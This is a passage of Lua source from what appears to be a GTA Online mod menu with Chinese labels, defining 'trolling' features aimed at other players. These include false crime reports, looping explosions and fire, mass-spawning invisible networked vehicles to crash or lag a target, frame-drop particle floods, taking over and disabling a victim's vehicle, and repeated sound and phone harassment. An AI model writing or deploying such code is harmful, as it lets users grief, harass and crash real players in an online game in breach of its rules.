                PLAYER.REPORT_CRIME(PlayerID, i, val)
            end
            util.yield(75)
        end
    end)
    menu.toggle_loop(trolling,"火箭雨", {'rockets'}, '要下一场轰轰烈烈的火箭雨吗？', function()
		rain_rockets(PlayerID, false)
		wait(500)
	end)
    local shit = menu.list(trolling, "撒尿喷屎选项", {}, "")
    menu.toggle_loop(shit, "让他持续喷屎", {"peeloop"}, "奥里给吃多了", function(state)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)
    request_ptfx_asset_peeloop("core_snow")
    GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")
    ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(
        "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false
    ) 
end)

    menu.toggle_loop(trolling, "无伤害爆炸", {""}, "在玩家身上循环无伤害的爆炸", function()
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(PlayerID), true)
        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end)	
    menu.toggle_loop(trolling, "喷火", {""}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 12, 100.0, true, false, 0.0)
    end)
    menu.toggle_loop(trolling, "喷水", {""}, "经典恶搞之一", function(on_click)
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
    end)
    menu.toggle_loop(shit, "在他身上撒尿", {}, ":尿他就完事了:", function()
        local coords = players.get_position(PlayerID)
        coords.z = coords['z'] + 1
        util.yield(65)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 79, 0, false, false, 0, false)
    end)
    pan = menu.list(trolling, "卡飞", {}, "")
    Ptools_PanTable = {}
   Ptools_PanCount = 1
   Ptools_FishPan = 20
   menu.action(pan, "开始卡飞", {}, "让他卡", function()
   menu.trigger_commands("anticrashcam on")
    local targetped = PLAYER.GET_PLAYER_PED(PlayerID)
       local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)
       local hash = util.joaat("tug")
       STREAMING.REQUEST_MODEL(hash)
       while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end
       for i = 1, Ptools_FishPan do
           Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)
           ----
           local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])
           NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
           NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
           NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
           NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, PlayerID, true)
           ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)
           ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)
           ----
           if SE_Notifications then
               util.toast("干！！！ " .. Ptools_PanCount)
           end
           Ptools_PanCount = Ptools_PanCount + 1
       end
   end)
   menu.slider(pan, "卡飞时间", {"friedfish"}, "卡飞时间，时间越多月卡", 1, 300, 20, 1, function(value)
       Ptools_FishPan = value
   end)
   menu.action(pan, "取消", {"rmpan"}, "Yep", function ()
       for x = 1, 5, 1 do
           for i = 1, #Ptools_PanTable do
               entities.delete_by_handle(Ptools_PanTable[i])
               util.yield(10)
           end
       end
       --
       Ptools_PanCount = 1
       Ptools_PanTable = {}
       STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))
       util.yield(800)
       menu.trigger_commands("anticrashcam off")
   end)
   menu.action(trolling, "小行星攻击", {}, "用小行星来攻击他", function() 
        local coords = players.get_position(PlayerID)
        coords.z = coords['z'] + 15.0
        local asteroid = entities.create_object(3751297495, coords)
        ENTITY.SET_ENTITY_DYNAMIC(asteroid, true)
    end)
   menu.toggle_loop(trolling, "走路带火", {}, "跑起来吧！！!", function()
        local coords = players.get_position(PlayerID)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)
    menu.action(trolling, "强制进入自由模式任务", {}, "强制玩家进入自由模式任务", function()
        menu.trigger_commands("mission".. players.get_name(PlayerID))
    end)
    menu.toggle_loop(trolling2, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    menu.toggle_loop(trolling2, "送给玩家一堆peds", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(PlayerID)
            else
                TpAllPeds(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "送给玩家一堆车", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(PlayerID)
            else
                TpAllVehs(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "送给玩家惊喜", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(PlayerID)
            else
                TpAllObjects(PlayerID)
            end
    end)
    menu.toggle_loop(trolling2, "超级惊喜！！！", {"bigsurprised"}, "爱他，就要给他超级惊喜", function (on_toggle)
            stcnm(PlayerID)
            phonesoundcnm(PlayerID)
            if on_toggle then
                TpAllPeds(PlayerID)
            else
                TpAllPeds(PlayerID)
            end
            if on_toggle then
                TpAllVehs(PlayerID)
            else
                TpAllVehs(PlayerID)
            end
           local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)
    menu.toggle_loop(trolling2, "骚扰她", {""}, "欠钱不换，必须骚扰", function()
        stcnm(PlayerID)
    end)	
	menu.toggle_loop(trolling2, "骚扰她V2", {""}, "st", function()
        phonesoundcnm(PlayerID)
    end)	
    menu.toggle_loop(trolling2, "防空系统启动", {}, "", function()
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(PlayerID), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)
    menu.toggle_loop(trolling2, "超级骚扰", {""}, "欠钱不换，必须骚扰", function()
        stcnm(PlayerID)
        phonesoundcnm(PlayerID)
        AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Air_Defences_Activated", PLAYER.GET_PLAYER_PED(PlayerID), "DLC_sum20_Business_Battle_AC_Sounds", true, true)
        util.yield(8000)
    end)
    local weapon_trolling = menu.list(trolling2, "武器恶搞", {}, "")
    local yanhuaegao = menu.list(trolling2, "烟花恶搞", {}, "新年快乐~！")
	menu.toggle_loop(weapon_trolling, "重型狙击枪", {}, "", function()
		local hash <const> = util.joaat("weapon_heavysniper")
		local camPos = CAM.GET_GAMEPLAY_CAM_COORD()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(camPos.x, camPos.y, camPos.z, pos.x, pos.y, pos.z, 200, false, hash, players.user_ped(), true, false, -1.0)
	end)
	menu.toggle_loop(weapon_trolling, "原子波", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_raypistol")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(weapon_trolling, "燃烧弹", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_molotov")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(weapon_trolling, "电磁脉冲发射器", {}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_emplauncher")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
	menu.toggle_loop(yanhuaegao, "烟花", {"Fireworksdownward"}, "", function()
		local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), false)
		local hash <const> = util.joaat("weapon_firework")
		request_weapon_asset(hash)
		WEAPON.GIVE_WEAPON_TO_PED(players.user_ped(), hash, 120, true, false)
		MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 3.0, pos.x, pos.y, pos.z - 2.0, 200, false, hash, 0, true, false, 2500.0)
	end)
    local firw = {speed = 1000}
    menu.toggle_loop(yanhuaegao, '头顶上的烟花', {}, '给他一场来自头顶的烟花盛宴', function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        local weap = util.joaat('weapon_firework')
        WEAPON.REQUEST_WEAPON_ASSET(weap)
        for y = 0, 1 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 4.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
            FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
            FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
        end
    end)
    local firw = {speed = 1000}
        menu.toggle_loop(yanhuaegao, '脚下的惊喜', {}, '给他一场来自脚下的烟花盛宴', function ()
            local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
            local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
            local weap = util.joaat('weapon_firework')
            WEAPON.REQUEST_WEAPON_ASSET(weap)
            for y = 0, 1 do
                MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + -1.0, tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
                --MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(tar1.x, tar1.y, tar1.z + 2.0, tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(10, 15), 200, 0, weap, 0, false, false, firw.speed)
                FIRE.ADD_EXPLOSION(tar1.x + math.random(-100, 100), tar1.y + math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false)
                FIRE.ADD_EXPLOSION(tar1.x - math.random(-100, 100), tar1.y - math.random(-100, 100), tar1.z + math.random(50, 75), 38, 1, false, false, 0, false) 
            end
    end)
    menu.action(trolling2, "消防栓的自由", {}, "", function()
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 13, 100.0, true, false, 0.0)
        util.request_model(200846641)
        local objects = {}
        for i = 1, 40 do
            local coords<const> = players.get_position(PlayerID)
            objects[#objects + 1] = entities.create_object(200846641, v3.new(coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z))
            util.yield()
        end
        util.yield(3000)
        for i = 1, 4 do
            local coords<const> = players.get_position(PlayerID)
            FIRE.ADD_EXPLOSION(coords.x + math.random(-3, 3), coords.y + math.random(-3, 3), coords.z, 64, 100, true, true, 0.5, true)
            util.yield(400)
        end
        util.yield(5000)
        for i = 1, #objects do
            entities.delete_by_handle(objects[i])
        end
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(200846641)
    end)
menu.toggle(trolling2, "闪他(会使他掉帧)", {""}, "远离!!!", function(state)
        if players.exists(PlayerID) then
        huaping = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(PlayerID).." on")
            menu.trigger_commands("confuse "..players.get_name(PlayerID).." on")
            while huaping do
        local player_pos = players.get_position(PlayerID)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(PlayerID).." off")
            menu.trigger_commands("confuse "..players.get_name(PlayerID).." off")
        end
    end
end)
   menu.action(trolling2,"垃圾车的工作时间", {}, "", function()
        veh_to_attach = 1
		V3 = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
		if table_kidnap == nil then
			table_kidnap = {}
		end
        hash = util.joaat("trash")
        ped_hash = util.joaat("MP_M_Cocaine_01")

        if STREAMING.IS_MODEL_A_VEHICLE(hash) then
            STREAMING.REQUEST_MODEL(hash)
            while not STREAMING.HAS_MODEL_LOADED(hash) do
                util.yield()
            end
            coords_ped = ENTITY.GET_ENTITY_COORDS(V3, true)

            local aab = 
			{
				x = -5784.258301,
				y = -8289.385742,
				z = -136.411270
			}
            ENTITY.SET_ENTITY_VISIBLE(ped_to_kidnap, false)
            ENTITY.FREEZE_ENTITY_POSITION(ped_to_kidnap, true)

            table_kidnap[veh_to_attach] = entities.create_vehicle(hash, ENTITY.GET_ENTITY_COORDS(V3, true),
            CAM.GET_FINAL_RENDERED_CAM_ROT(0).z)
            while not STREAMING.HAS_MODEL_LOADED(ped_hash) do
                STREAMING.REQUEST_MODEL(ped_hash)
                util.yield()
            end
            ped_to_kidnap = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ped_to_drive = entities.create_ped(28, ped_hash, aab, CAM.GET_FINAL_RENDERED_CAM_ROT(2).z)
            ENTITY.SET_ENTITY_INVINCIBLE(ped_to_drive, true)
            ENTITY.SET_ENTITY_INVINCIBLE(table_kidnap[veh_to_attach], true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(table_kidnap[veh_to_attach], ped_to_kidnap, 0, 0, 1, -1, 0, 0, 0, false,
                true, true, false, 0, false)
            ENTITY.SET_ENTITY_COORDS(ped_to_kidnap, coords_ped.x, coords_ped.y, coords_ped.z - 1, false, false, false,
                false)
            PED.SET_PED_INTO_VEHICLE(ped_to_drive, table_kidnap[veh_to_attach], -1)
            TASK.TASK_VEHICLE_DRIVE_WANDER(ped_to_drive, table_kidnap[veh_to_attach], 20, 16777216)
            util.yield(500)
            entities.delete_by_handle(ped_to_kidnap)
            veh_to_attach = veh_to_attach + 1
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(ped_hash)
        end
end)
    menu.toggle_loop(trolling2, "掉帧Pro Max", {"Pro Max"}, "", function()
        if players.exists(PlayerID) then
            local freeze_toggle = menu.ref_by_rel_path(menu.player_root(PlayerID), "Trolling>Freeze")
            local player_pos = players.get_position(PlayerID)
            menu.set_value(freeze_toggle, true)
            request_ptfx_asset("core")
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_respray_smoke", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_sht_electrical_box", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "exp_extinguisher", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "veh_rotor_break", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_ray_heli_aprtmnt_water", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "ent_dst_inflatable", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            request_ptfx_asset("scr_sum2_hal")
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "scr_sum2_hal_rider_death_green", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
                "scr_sum2_hal_rider_death_white", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            GRAPHICS.USE_PARTICLE_FX_ASSET("core")
            GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
               "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
            menu.set_value(freeze_toggle, false)
        end
    end)
    local zaijuegao = menu.list(bozo, "载具恶搞", {}, "")
    menu.action(zaijuegao, "小恐龙来喽~", {""}, "嗷呜~~~~~", function(on_click)
        changemodel(PlayerID)
    end)
    menu.action(zaijuegao, "奇怪附加模型的载具恶搞", {""}, "不知如何形容", function(on_click)
        jibamodel(PlayerID)
    end)
    menu.toggle_loop(zaijuegao, "载具卡顿", {""}, "让他以为是延迟的问题", function ()
        letcarlagging(PlayerID)
    end)
   menu.toggle_loop(zaijuegao, "压榨他", {"crush"}, "压出自我，压出快感，鲁花5S压榨花生油.", function(on_click)
      store_dir = filesystem.store_dir() .. '\\YMss\\'
sound_selection_dir = store_dir .. '\\sound10.txt'
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z'] + 20.0
        request_model(1917016601)
        local truck = entities.create_vehicle(1917016601, coords, 0.0)
        local vel = ENTITY.GET_ENTITY_VELOCITY(vel)
        ENTITY.SET_ENTITY_VELOCITY(truck, vel['x'], vel['y'], -100.0)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED(truck, 3)
		VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_NON_SCRIPT_PLAYERS(truck, true)
		wait(2000)
		entities.delete_by_handle(truck)
    end)
    menu.action(zaijuegao, "爆他胎", {}, "考验他的驾驶技术", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            for i=0, 7 do
                VEHICLE.SET_VEHICLE_TYRE_BURST(car, i, true, 1000.0)
            end
        end
    end)
    menu.toggle_loop(zaijuegao, "螺旋汽车", {"beybladev"}, "让他晕头转向", function(on)
        carspin(PlayerID)
    end)
     menu.action(zaijuegao, "删除载具", {}, "删除此玩家正在驾驶的载具", function()
        deleplayercar(PlayerID)
    end)
    local kickcar1 = menu.list(zaijuegao, "载具踢出选项", {}, "")
    menu.action(kickcar1, "踢出载具V1", {}, "", function(toggled)
        kickcar(PlayerID)
    end)
    menu.action(kickcar1, "踢出载具V2", {}, "", function()
        menu.trigger_commands("vehkick".. players.get_name(PlayerID))
    end)
    menu.action(zaijuegao, "将墙放在玩家面前", {}, "在玩家面前放置墙壁,半秒后删除", function ()
        qfmq(PlayerID)
    end)
    menu.toggle(zaijuegao, "强制手刹", {}, "", function(on)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
    if car ~= 0 then
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, on)
    end
    end)
    menu.toggle_loop(zaijuegao, "随机制动", {}, "随机刹车", function(on)
    local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
    if car ~= 0 then
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, true)
        util.yield(500)
        request_control_of_entity(car)
        VEHICLE.SET_VEHICLE_HANDBRAKE(car, false)
        util.yield(math.random(3000, 15000))
    end
end)
    menu.action(zaijuegao, "将载具调头", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y'], rot['z']+180, 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)

    menu.action(zaijuegao, "将载具翻转", {}, "", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local rot = ENTITY.GET_ENTITY_ROTATION(car, 0)
            local vel = ENTITY.GET_ENTITY_VELOCITY(car)
            ENTITY.SET_ENTITY_ROTATION(car, rot['x'], rot['y']+180, rot['z'], 0, true)
            ENTITY.SET_ENTITY_VELOCITY(car, -vel['x'], -vel['y'], vel['z'])
        end
    end)
    menu.list_action(zaijuegao, "搞他车门", {}, "", {"全部打开", "全部关闭", "损坏车门"}, function(index, value, click_type)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            local d = VEHICLE.GET_NUMBER_OF_VEHICLE_DOORS(car)
            for i=0, d do
                pluto_switch index do
                    case 1: 
                        VEHICLE.SET_VEHICLE_DOOR_OPEN(car, i, false, true)
                        break
                    case 2:
                        VEHICLE.SET_VEHICLE_DOOR_SHUT(car, i, true)
                        break
                    case 3:
                        VEHICLE.SET_VEHICLE_DOOR_BROKEN(car, i, false)
                        break
                end
            end
        end
    end)
    menu.action(zaijuegao, "关掉他的发动机", {}, "让他懵逼", function(on)
        local car = PED.GET_VEHICLE_PED_IS_IN(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID), true)
        if car ~= 0 then
            request_control_of_entity(car)
            VEHICLE.SET_VEHICLE_ENGINE_ON(car, false, true, false)
        end
    end)
control_veh = player_toggle_loop(zaijuegao, PlayerID, "他的载具由你控制", {}, "必须在陆地上的载具才能使用该功能,对部分菜单无效", function(toggle)
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        local player_veh = PED.GET_VEHICLE_PED_IS_IN(ped)
        local class = VEHICLE.GET_VEHICLE_CLASS(player_veh)
        if not players.exists(PlayerID) then util.stop_thread() end

        if v3.distance(ENTITY.GET_ENTITY_COORDS(players.user_ped(), false), players.get_position(PlayerID)) > 1000.0 
        and v3.distance(pos, players.get_cam_pos(players.user())) > 1000.0 then
            util.toast("精神小伙提醒你:距离玩家太远了")
            menu.set_value(control_veh, false)
        return end

        if class == 15 then
            util.toast("精神小伙提醒你:玩家在直升机上")
            menu.set_value(control_veh, false)
        return end
        
        if class == 16 then
            util.toast("精神小伙提醒你:玩家在飞机上")
            menu.set_value(control_veh, false)
        return end

        if PED.IS_PED_IN_ANY_VEHICLE(ped, false) then
            if PAD.IS_CONTROL_PRESSED(0, 34) then
                while not PAD.IS_CONTROL_RELEASED(0, 34) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 7, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 35) then
                while not PAD.IS_CONTROL_RELEASED(0, 35) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 8, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 32) then
                while not PAD.IS_CONTROL_RELEASED(0, 32) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 23, 100)
                    util.yield()
                end
            elseif PAD.IS_CONTROL_PRESSED(0, 33) then
                while not PAD.IS_CONTROL_RELEASED(0, 33) do
                    TASK.TASK_VEHICLE_TEMP_ACTION(ped, PED.GET_VEHICLE_PED_IS_IN(ped), 28, 100)
                    util.yield()
                end
            end
        else
            util.toast("精神小伙提醒你:玩家不在载具中")
            menu.set_value(control_veh, false)
        end
        util.yield()
        
    end)
    menu.toggle_loop(zaijuegao, "禁用载具", {}, "", function(toggle)
    local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
    if (PED.IS_PED_IN_ANY_VEHICLE(p)) then
        TASK.CLEAR_PED_TASKS_IMMEDIATELY(p)
    else
        local veh2 = PED.GET_VEHICLE_PED_IS_TRYING_TO_ENTER(p)
        entities.delete_by_handle(veh2)
    end
    end)
local online_player = menu.list(bozo, "线上选项", {}, "")
    local cherter = menu.list(online_player, "反无敌选项", {}, "使用魔法打败魔法~")
    menu.action(cherter, "眩晕爆炸", {"stun"}, "", function()
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local pos = ENTITY.GET_ENTITY_COORDS(ped)
